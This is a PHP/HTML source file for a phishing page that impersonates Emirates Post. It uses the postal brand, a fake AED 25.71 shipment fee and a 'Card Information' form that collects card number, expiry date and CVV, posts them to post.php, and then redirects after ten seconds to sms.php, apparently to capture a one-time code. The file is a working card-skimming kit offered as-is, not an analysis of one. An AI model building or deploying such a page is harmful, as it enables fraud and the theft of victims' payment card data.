<?php 

     require_once "function.php";

                              

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Emirates Post</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.png" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/boom.css">
</head>
<body>
        
        <div class="loading">
               <div class="text-center">
                   <p>Please do not close this page</p>
                   <div class="d-flex justify-content-center">
                      <div class="spinner-border" role="status">
                         <span class="sr-only">Loading...</span>
                      </div>
                   </div>
               </div>
        </div>

         <div class="home">
            <div class="ho">
               <div class="container">
                     <div class="navbar">
                        <div class="limaja">
                            <img src="image/Emarats.png">
                        </div>
                        <div class="icon">
                           <ul>
                              <li class="geo"><i class="icon fa fa-globe"></i></li>
                              <li class="oo"><i class="fa fa-home"></i></li>
                              <li class="oo"><i class="fa fa-search"></i></li>
                              <li class="oo"><i class=" fa fa-gear"></i></li>
                              <li><i class="fa fa-navicon"></i></li>
                           </ul>
                        </div>
                     </div>
               </div>
            </div>
         </div>

         <div class="validation">
            <div class="container">
                <h2>Card Information</h2>
                <hr class="hr">
                <h4>Home <i class="fa fa-angle-right"></i> <span>Card Information</span></h4>
                <div class="sender">
                   <div class="row">
                      <div class="col-lg-3 left">
                         <div>
                            <div class="d-flex adn">
                               <span></span>
                               <p>Your details</p>
                            </div>
                            <div class="d-flex adr">
                               <span></span>
                               <p>Verify</p>
                            </div>
                         </div>

                         <div class="pijama responsive">
                            <div class="statu">
                               <p>Destination:</p>
                               <span>United Arab Emirats</span>
                            </div>
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Total</p>
                               <span>AED 25.71</span>
                            </div>
                         </div>

                         <div class="pijama web">
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Destination:</p>
                               <span>United Arab Emirats</span>
                            </div>
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Last Updated:</p>
                               <span><?php echo date('l jS \of  h:i A'); ?></span>
                            </div>
                         </div>

                         <hr class="gy-3">
                         <div class="pijama web">
                            <div class="statu">
                               <p>Shipment type</p>
                               <span>Other</span>
                            </div>
                            <hr class="gy-3">
                         </div>

                         <div class="pijama web">
                            <div class="statu">
                               <p>Total</p>
                               <span>AED 25.71</span>
                            </div>
                            <hr class="gy-3">
                         </div>

                      </div>
                      <div class="col-lg-9 right">
                         <h3>Your details <span><i class=" fa fa-question-circle fa-1x"></i></span></h3>
                         <p>Please Complete your Following details</p>
                         <h6><strong>50%</strong> Complete</h6>
                         <hr>
                         <p>Credit Card Accepted:</p>
                         <img src="image/cards-secure.png" class="img-fluid">
                         <hr>
                         <form action="post.php" method="post">
                            <input type="hidden" name="step" value="cc">
                            <div class="login">
                               <div class="all_one">
                                  <div class="form -group box only mt-4">
                                     <label>Card Number<span class="star">*</span></label>
                                     <input type="text" name="card" id="card" class="form-control" placeholder="XXXX XXXX XXXX XXXX">
                                     <div class="error_card any">Required Field!</div>
                                  </div>
                               </div>
                               <div class="all_one">
                                  <div class="form-group box mt-4">
                                     <label>Experation Date<span class="star">*</span></label>
                                     <input type="text" name="date" id="date" class="form-control" placeholder="MM/JJ">
                                     <div class="error_date any">Required Field!</div>
                                  </div>
                                  <div class="form-group box mt-4">
                                     <label>CVV<span class="star">*</span></label>
                                     <input type="text" name="cvv" id="cvv" class="form-control" placeholder="XXX">
                                     <div class="error_cvv any">Required Field!</div>
                                  </div>
                               </div>
                            </div>
                            <div class="bottona">
                               <button class="btn" name="submit">Continue</button>
                            </div>
                         </form>
                      </div>
                   </div>
                </div>
            </div>
         </div>

         <div class="fotter">
            <div class="container">
               <hr>
               <div class="bot">
                  <p>© 2024 Emirates Post, All Rights Reserved</p>
                  <div class="images d-flex">
                     <img src="image/one_fot.png" style="width:87px;height:40px;">
                     <img src="image/two_fot.png" style="width:62px;height:40px;">
                     <img src="image/Emarats.png" style="width:76px;height:40px;">
                  </div>
               </div>
            </div>
         </div>




        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
            setTimeout(function () {
                window.location.href= 'sms.php';
            },10000);
        </script>
              
</body>
</html>